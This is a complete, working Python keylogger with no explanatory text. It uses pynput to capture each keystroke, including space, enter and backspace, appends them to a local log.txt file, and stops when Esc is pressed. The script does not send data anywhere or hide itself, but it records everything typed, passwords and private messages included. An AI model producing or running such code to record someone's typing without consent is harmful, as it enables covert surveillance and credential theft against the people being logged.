import pynput
from pynput import keyboard

def on_press(key):
    try:
        # Check if the key is a character key
        if isinstance(key.char, str):
            # Write the character to log.txt
            with open('log.txt', 'a') as f:
                f.write(key.char)
    except AttributeError:
        # Handle special keys (e.g., Shift, Ctrl, Alt, etc.)
        if key == keyboard.Key.space:
            with open('log.txt', 'a') as f:
                f.write(' ')
        elif key == keyboard.Key.enter:
            with open('log.txt', 'a') as f:
                f.write('\n')
        elif key == keyboard.Key.backspace:
            with open('log.txt', 'a') as f:
                f.write('\b')

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Collect events until released
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()